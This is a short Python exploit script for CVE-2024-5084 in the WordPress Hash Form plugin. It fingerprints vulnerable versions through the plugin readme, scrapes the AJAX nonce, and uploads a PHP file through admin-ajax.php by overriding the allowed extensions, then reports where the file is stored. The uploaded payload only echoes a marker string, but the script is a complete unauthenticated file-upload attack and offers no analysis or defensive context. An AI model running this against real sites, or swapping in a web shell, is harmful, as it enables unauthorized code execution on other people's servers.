#!/usr/bin/env python3
# Usage: Python3 CVE-2024-5084.py
import requests
import re
import random
__import__('warnings').simplefilter('ignore',Warning)

headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Mobile Safari/537.36"
}

session = requests.session()

def Check_hash_form(url):
        # print(f" [ LOG ] (CHECKING) {url}")
        try:
            response_text = session.get("{}/wp-content/plugins/hash-form/readme.txt".format(url)).text
            if 'hashthemes' in response_text and "1.1.1" not in response_text:
                return True
        except Exception as e:
             print(e)
             return None

def Get_nounce(url):
    try:
        response_text = session.get(url).text
        return re.findall(r'hashform_vars\s*.*=\s*.*"ajax_nounce":"(.*?)"', response_text)[0]
    except Exception as e:
        print(e)
        return None


def upload_file(url, nounce, name):
    php_file = '''<?php echo 'KHABuhwxnUHDDW' ?>'''
    params = {
                    "action": "hashform_file_upload_action",
                    "file_uploader_nonce": nounce,
                    "allowedExtensions[0]": "php",
                    "sizeLimit": 69696969,
                    "qqfile": name,
                }
    response_text = session.post("{}/wp-admin/admin-ajax.php".format(url), params=params, data=php_file).text
    if '"success":true,' in response_text:
        print(f"{url} is vulnerable!")
        return True
    else:
        return None
    
def Exploit(url):
    if Check_hash_form(url) == True:
        nounce = Get_nounce(url)
        file_name  = "{}.php".format(random.getrandbits(32))
        if upload_file(url, nounce, file_name) == True:
            file_localtion = url + f"/wp-content/uploads/hashform/temp/{file_name}.php"
            print(f"The upload file is save to {file_localtion}")
            return True
        else:
            print("Upload failed!")
            return None
    else:
        print("The hash form isn't vulnerable")

if __name__ == '__main__':
    url = 'http://127.0.0.1'
    Exploit(url)
